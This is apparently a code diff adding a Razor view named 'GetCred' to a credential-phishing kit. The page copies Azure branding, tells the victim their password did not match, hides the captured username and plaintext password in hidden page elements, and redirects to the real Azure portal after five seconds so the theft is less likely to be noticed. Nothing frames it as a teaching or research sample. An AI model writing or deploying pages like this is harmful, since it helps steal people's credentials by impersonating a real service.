@@ -1,0 +1,23 @@
+﻿@{
+    Layout = "~/Views/Shared/_Layout.cshtml";
+    ViewBag.Title = "GetCred";
+
+
+}
+<p hidden>@Model Credentials</p>
+
+<body style="background-color: rgb(0, 114, 198);"></body>
+
+<div style="color:white; text-align:center;">
+    <h1><b>Hi @Model.username!</b></h1> <br /><br />
+    <h2>The entered password did not match our recordings.</h2>
+    <h2>Please try again.</h2>
+    <div>
+        <img src="https://partner.microsoft.com/-/media/mssc/mpn/partner/solutions/images/azure-500x281-v2.ashx?h=281&la=en&w=500&hash=8AE9B5E03E3973C6D23C12415E2737C908A56BF1" width="320" height="200">
+    </div>
+    <p hidden>password = @Model.password</p> <br />
+    </div>
+
+    <meta http-equiv="refresh" content="5; URL='https://portal.azure.com'" />
+
+}
